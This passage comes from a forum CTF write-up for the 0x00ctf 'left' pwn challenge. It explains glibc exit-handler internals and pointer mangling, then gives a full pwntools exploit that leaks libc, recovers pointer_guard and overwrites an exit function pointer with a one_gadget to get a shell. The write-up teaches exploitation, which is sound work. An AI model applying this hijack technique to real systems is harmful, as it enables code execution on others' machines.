mov     edi, offset aWriteAddress ; "write address:"
call    _puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    _fflush
lea     rax, [rbp+address]
mov     rsi, rax
mov     edi, offset aLu ; "%lu"
mov     eax, 0
call    ___isoc99_scanf
mov     edi, offset aNewValue ; "new value:\n"
call    _puts
mov     rax, cs:__bss_start
mov     rdi, rax        ; stream
call    _fflush
lea     rax, [rbp+value]
mov     rsi, rax
mov     edi, offset aLu ; "%lu"
mov     eax, 0
call    ___isoc99_scanf
mov     rax, [rbp+address]
mov     rdx, [rbp+value]
mov     [rax], rdx
mov     edi, 0          ; status
call    _exit
</code></pre>
<p>So, it first prints an ASCII art, then comes a <strong>libc_leak</strong> <em>(printf_got contents)</em>.<br>
after that, It‚Äôll ask for an address to print it‚Äôs content.<br>
then, It will take an address then requests a value to assign to this last.<br>
but in the end, It‚Äôll kill your hopes with an <em>exit(0);</em>!</p>
<p>It‚Äôs easy to deduce that the real work and analyse we should do is on exit internals‚Ä¶</p>
<ul>
<li>On <em>exit</em> call:</li>
</ul>
<pre><code class="lang-auto">void
exit (int status)
{
   __run_exit_handlers (status, &amp;__exit_funcs, true, true);
}
</code></pre>
<ul>
<li>
<em>__run_exit_handlers</em> ?</li>
</ul>
<pre><code class="lang-auto">void
   attribute_hidden
   __run_exit_handlers (int status, struct exit_function_list **listp,
                        bool run_list_atexit, bool run_dtors)
   {
     /* First, call the TLS destructors.  */
   #ifndef SHARED
     if (&amp;__call_tls_dtors != NULL)
   #endif
       if (run_dtors)
         __call_tls_dtors ();
#
     /* We do it this way to handle recursive calls to exit () made by
        the functions registered with `atexit' and `on_exit'. We call
        everyone on the list and use the status value in the last
        exit (). */
     while (true)
       {
         struct exit_function_list *cur;
#
         __libc_lock_lock (__exit_funcs_lock);
#
       restart:
         cur = *listp;
#
         if (cur == NULL)
           {
             /* Exit processing complete.  We will not allow any more
                atexit/on_exit registrations.  */
             __exit_funcs_done = true;
             __libc_lock_unlock (__exit_funcs_lock);
             break;
           }
#
         while (cur-&gt;idx &gt; 0)
           {
             struct exit_function *const f = &amp;cur-&gt;fns[--cur-&gt;idx];
             const uint64_t new_exitfn_called = __new_exitfn_called;
#
             /* Unlock the list while we call a foreign function.  */
             __libc_lock_unlock (__exit_funcs_lock);
             switch (f-&gt;flavor)
               {
                 void (*atfct) (void);
                 void (*onfct) (int status, void *arg);
                 void (*cxafct) (void *arg, int status);
#
               case ef_free:
               case ef_us:
                 break;
               case ef_on:
                 onfct = f-&gt;func.on.fn;
   #ifdef PTR_DEMANGLE
                 PTR_DEMANGLE (onfct);
   #endif
                 onfct (status, f-&gt;func.on.arg);
                 break;
               case ef_at:
                 atfct = f-&gt;func.at;
   #ifdef PTR_DEMANGLE
                 PTR_DEMANGLE (atfct);
   #endif
                 atfct ();
                 break;
               case ef_cxa:
                 /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
                    we must mark this function as ef_free.  */
                 f-&gt;flavor = ef_free;
                 cxafct = f-&gt;func.cxa.fn;
   #ifdef PTR_DEMANGLE
                 PTR_DEMANGLE (cxafct);
   #endif
                 cxafct (f-&gt;func.cxa.arg, status);
                 break;
               }
             /* Re-lock again before looking at global state.  */
             __libc_lock_lock (__exit_funcs_lock);
#
             if (__glibc_unlikely (new_exitfn_called != __new_exitfn_called))
               /* The last exit function, or another thread, has registered
                  more exit functions.  Start the loop over.  */
               goto restart;
           }
#
         *listp = cur-&gt;next;
         if (*listp != NULL)
           /* Don't free the last element in the chain, this is the statically
              allocate element.  */
           free (cur);
#
         __libc_lock_unlock (__exit_funcs_lock);
       }
#
     if (run_list_atexit)
       RUN_HOOK (__libc_atexit, ());
#
     _exit (status);
   }
</code></pre>
<ul>
<li>
<p>Notes:</p>
</li>
<li>
<p>First thing it does, is calling <strong>TLS</strong> destructors; That‚Äôs something we won‚Äôt <em>overthink or analyse</em> for now.</p>
</li>
<li>
<p>The interesting part lies in the <strong>while (cur-&gt;idx &gt; 0)</strong> loop. We have <em>cur</em> declared as a <strong>exit_function_list</strong>, this latter contains <strong>struct exit_function fns[32];</strong>!</p>
</li>
<li>
<p>We will be then checking the content of this <strong>exit_function</strong> struct.</p>
</li>
<li>
<p><em>exit_function</em> struct:</p>
</li>
</ul>
<pre><code class="lang-auto">   struct exit_function
     {
       /* `flavour' should be of type of the `enum' above but since we need
          this element in an atomic operation we have to use `long int'.  */
       long int flavor;
       union
         {
           void (*at) (void);
           struct
             {
               void (*fn) (int status, void *arg);
               void *arg;
             } on;
           struct
             {
               void (*fn) (void *arg, int status);
               void *arg;
               void *dso_handle;
             } cxa;
         } func;
     };
</code></pre>
<ul>
<li>
<p>Notes:</p>
</li>
<li>
<p>We can clearly see, that it has alot of interesting pointers on ‚Äò<em>func</em>‚Äô struct within.</p>
</li>
<li>
<p>Those will be our target to overwrite, but let‚Äôs not forget that they are ‚Äò<strong>DEMANGLED</strong>‚Äô before being called, so this says they are encrypted, to understand that, let‚Äôs check the <em>PTR_DEMANGLE</em> macro.</p>
</li>
<li>
<p><em>PTR_DEMANGLE</em> macro:</p>
</li>
</ul>
<pre><code class="lang-auto">   #  define PTR_DEMANGLE(var)        asm ("ror $2*" LP_SIZE "+1, %0\n"             \
                                        "xor %%fs:%c2, %0"                          \
                                        : "=r" (var)                                \
                                        : "0" (var),                                \
                                          "i" (offsetof (tcbhead_t,                 \
                                                         pointer_guard)))
</code></pre>
<ul>
<li>
<p>Notes:</p>
</li>
<li>
<p>It isn‚Äôt a big macro, there‚Äôs a ‚Äò<em>ror</em>‚Äô operation followed by a ‚Äò<em>xor</em>‚Äô one.</p>
</li>
<li>
<p>The first operation takes the <strong>(2*0x8)+1 = 0x11</strong> and rotates right the value of the <em>var</em> by that number.</p>
</li>
<li>
<p>The second is a bit problematic, since it goes to the <strong>TCB</strong>(<em>task control block</em>) and takes a secret value named ‚Äò<em>pointer_guard</em>‚Äô.</p>
</li>
<li>
<p>But here‚Äôs the thing, ‚Äò<em>xor</em>‚Äô can be reversed easily, such as <em>‚Äò2 ^ 0 = 2‚Äô</em> =&gt; <em>‚Äò0 = 2 ^ 2‚Äô</em>. And that‚Äôs what we are going to use, to get the <em>pointer_guard</em> value, so we can mangle our <em>fake pointer</em> later, but to do that, we need the <em>mangled pointer</em>, and the <em>original function</em> that‚Äôs been mangled.</p>
</li>
<li>
<p>It‚Äôs time to run <strong>gdb</strong> and analyse what‚Äôs in there‚Ä¶<br>
Oh lord, it asks for a valid address to read/write, but we just want to analyse exit behaviour for now <img src="../../images/emoji/twitter/crying_cat_face.png%3Fv=9" title=":crying_cat_face:" class="emoji" alt=":crying_cat_face:">‚Ä¶<br>
WE‚ÄôLL <strong>j* 0x4008a6</strong> BOYS!<br>
But before doing that, let‚Äôs set a breakpoint on the <strong>__run_exit_handlers</strong>!</p>
</li>
<li>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/fa8f4b6f96abfb644aa7c02ec5126e06b77ac1be.png" width="484" height="94"></p>
</li>
</ul>
<p>There we go, after jumping to the exit part, we land on that breakpoint.<br>
We then continue stepping ‚Äò<em>ni</em>‚Äô and paying big attention to the instruction block.</p>
<ul>
<li><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8b9ecf745bc1d2ab9f891824b17861fae9cfe282.png" width="638" height="85"></li>
</ul>
<p>Seems like we reached the interesting part, now we step really carefully, and we check <strong>registers</strong> while doing that.<br>
We have <em>RCX</em> register pointing to <strong>initial</strong>, so it will take the <em>mangled pointer</em> and put it in <em>RAX</em>‚Ä¶<br>
[RCX+0x10] is <em>NULL</em>.<br>
Then it‚Äôll do the xor and ror operation, and calls the demangled <em>RAX</em>.</p>
<ul>
<li><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/22d84cea8faa92bbc00155b07721c8b3fa0d5cb3.png" width="408" height="67"></li>
</ul>
<p>This says that the original pointer is _dl_fini.</p>
<ul>
<li>And about the <strong>initial</strong> thing, check the second argument <strong>__exit_funcs</strong>, let‚Äôs take a look at the source!</li>
</ul>
<pre><code class="lang-auto">static struct exit_function_list initial;
struct exit_function_list *__exit_funcs = &amp;initial;
</code></pre>
<ul>
<li>A little look with <strong>gdb</strong> shows the following:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/2/24ef8d8db7614fb2ca629cd2cc5e99b7eb1c21e2.png" width="289" height="305"><br>
And the pointer we‚Äôll deal with is <strong>at</strong> one.<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4b63d67936efde9871a9abcbe73e8fffee28a07f.png" width="437" height="34"><br>
It‚Äôs at 8*3 from <strong>initial</strong>.</li>
</ul>
<p>But we will later find problem with offsets to these structures, since they aren‚Äôt exported‚Ä¶</p>
<p>Further reading on that:<br>
<a href="https://binholic.blogspot.com/2017/05/notes-on-abusing-exit-handlers.html" rel="noopener nofollow ugc">This awesome article.</a></p>
<ul>
<li>Let‚Äôs start writing the exploit slowly:<br>
First things first, we‚Äôll be storing the <em>printf leak</em> and calculating <em>libc_base</em>.</li>
</ul>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *
#
c = process('./left')
# LOCAL
printf_diff = 0x54340
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
# INTERACTIVE
c.interactive()
</code></pre>
<ul>
<li>Now we will editing only <strong>EXPLOIT</strong> and <strong>OFFSET</strong> part‚Ä¶<br>
We will add few offsets, the initial is close to an exported symbol ‚Äò<em>__abort_msg</em>‚Äô + [0x10, 0x20 ‚Ä¶ 0x100] on multiple libc‚Äôs.<br>
And then there‚Äôs the big problem ‚Äò<em>_dl_fini</em>‚Äô. This one on remote will require creativity to get, either using the arbitrary read to get it, or downloading the same distro as remote.<br>
But since we‚Äôre local only here, we are safe, we‚Äôll just get it with <strong>gdb</strong>. (<em>substract libc_base from it</em>)</li>
</ul>
<pre><code class="lang-python"># LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print 'libc_base @ ' + hex(libc_base)
</code></pre>
<ul>
<li>Now, we reach the arbitrary read part, we will leak the <em>mangled pointer</em>!</li>
</ul>
<pre><code class="lang-python"># LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print 'libc_base @ ' + hex(libc_base)
# 
c.recvuntil('read address:')
c.sendline(str(libc_at))
c.recvuntil('content: ')
mangled_ptr = int(c.recvline()[:-1], 10)
print 'mangled_ptr @ ' + hex(mangled_ptr)
</code></pre>
<p>We get<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/4/44c26febd1396c1e69834743b7bf86ddf16aa259.png" width="366" height="50"><br>
And that‚Äôs the awaited response, we did well leaking!<br>
Now, moving on‚Ä¶</p>
<ul>
<li>Now we need to calculate the <em>pointer_guard</em> value!</li>
</ul>
<pre><code class="lang-python"># LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print 'libc_base @ ' + hex(libc_base)
# 
c.recvuntil('read address:')
c.sendline(str(libc_at))
c.recvuntil('content: ')
mangled_ptr = int(c.recvline()[:-1], 10)
print 'mangled_ptr @ ' + hex(mangled_ptr)
# 
pointer_guard = ror(mangled_ptr, 0x11, 64) # we do ror operation first
pointer_guard ^= _dl_fini                  # xor with original value
print 'pointer_guard @ ' + hex(pointer_guard)
#
</code></pre>
<ul>
<li>We reached the write part, it request an address to write to and the new value to assign!<br>
That‚Äôs perfect for overwriting the ‚Äò<em>at</em>‚Äô to point to 0x1 as a test!</li>
</ul>
<pre><code class="lang-python"># LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
print 'libc_base @ ' + hex(libc_base)
# 
c.recvuntil('read address:')
c.sendline(str(libc_at))
c.recvuntil('content: ')
mangled_ptr = int(c.recvline()[:-1], 10)
print 'mangled_ptr @ ' + hex(mangled_ptr)
# 
pointer_guard = ror(mangled_ptr, 0x11, 64) # we do ror operation first
pointer_guard ^= libc_dl                   # xor with original value
print 'pointer_guard @ ' + hex(pointer_guard)
#
address = 0x1
address ^= pointer_guard                   # xor with the pointer_guard
address = rol(address, 0x11, 64)           # reverse ror operation, rol!
# 
pause()                                    # to attach
#
c.recvuntil('write address:')
c.sendline(str(libc_at))
c.recvuntil('new value:')
c.sendline(str(address)) 
</code></pre>
<ul>
<li>
<p>Running the script, attaching to <strong>gdb</strong> and resuming execution gives the following:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/6/6748f14895c459cdcf85c831f75f4bd704e12831.png" width="491" height="135"><br>
<img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"> We control <em>RIP</em>.</p>
</li>
<li>
<p>Now what‚Äôs left is simple, we will use <a href="https://github.com/david942j/one_gadget" rel="noopener nofollow ugc">one_gadget</a> script by <strong>david942j</strong>.<br>
It will look for gadgets that take the argument ‚Äò<em>/bin/sh</em>‚Äô, and call ‚Äò<em>execve</em>‚Äô, ‚Äò<em>execl</em>‚Äô‚Ä¶ (<em>there are multiple of 'em in each libc</em>)<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/a/af2ad36fb43d92450661714d671f6ff3dfdfa651.png" width="644" height="275"><br>
We take the first and try and see if he‚Äôll work, if not, the requirements aren‚Äôt met ‚Äò<strong>[rsp + 0x30] == NULL in the first</strong>‚Äô!<br>
So we try them one by one.<br>
In my case, the fourth one worked.</p>
</li>
<li>
<p>We can then enjoy our shell!<br>
<img src="https://0x00sec.s3.amazonaws.com/original/2X/1/1102dd76b286001e45e0b298fb7e7b66f016f794.png" width="362" height="160"></p>
</li>
<li>
<p>Full exploit:</p>
</li>
</ul>
<pre><code class="lang-python">#!/usr/bin/python
from pwn import *
#
c = process('./left')
# LOCAL
printf_diff = 0x54340
__abort_msg_diff = 0x3c3e00
_dl_fini_diff = 0x3d9600
one_diff = 0xe8618
# EXPLOIT
c.recvuntil('printf(): ')
libc_printf = int(c.recvline()[:-1], 10)
libc_base = libc_printf - printf_diff
libc_dl = libc_base + _dl_fini_diff
libc_at = libc_base + __abort_msg_diff + 0x80 + 8*3
one = libc_base + one_diff
print 'libc_base @ ' + hex(libc_base)
# 
c.recvuntil('read address:')
c.sendline(str(libc_at))
c.recvuntil('content: ')
mangled_ptr = int(c.recvline()[:-1], 10)
print 'mangled_ptr @ ' + hex(mangled_ptr)
# 
pointer_guard = ror(mangled_ptr, 0x11, 64) # we do ror operation first
pointer_guard ^= libc_dl                   # xor with original value
print 'pointer_guard @ ' + hex(pointer_guard)
#
one ^= pointer_guard                       # xor with the pointer_guard
one = rol(one, 0x11, 64)                   # reverse ror operation, rol!
#
pause()
# 
c.recvuntil('write address:')
c.sendline(str(libc_at))
c.recvuntil('new value:')
c.sendline(str(one))
# INTERACTIVE
c.interactive()
</code></pre>
<p>For remote case, check <a href="https://gist.github.com/romanking98/5f5ff9114fc011c9ac8c88aa253bcc69" rel="noopener nofollow ugc">DCUA</a> and <a href="https://github.com/SPRITZ-Research-Group/ctf-writeups/tree/master/0x00ctf-2017/pwn/left-250" rel="noopener nofollow ugc">SPRITZ</a> writeups.</p>
<p>Hope you liked the article and learned as well! <img src="../../images/emoji/twitter/smiley.png%3Fv=9" title=":smiley:" class="emoji" alt=":smiley:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="15" />
<span class="post-likes">15 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="5314.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2018-03-06T19:31:44Z" class="post-time">
March 6, 2018, 7:31pm
</time>
<meta itemprop="dateModified" content="2018-03-06T19:31:44Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
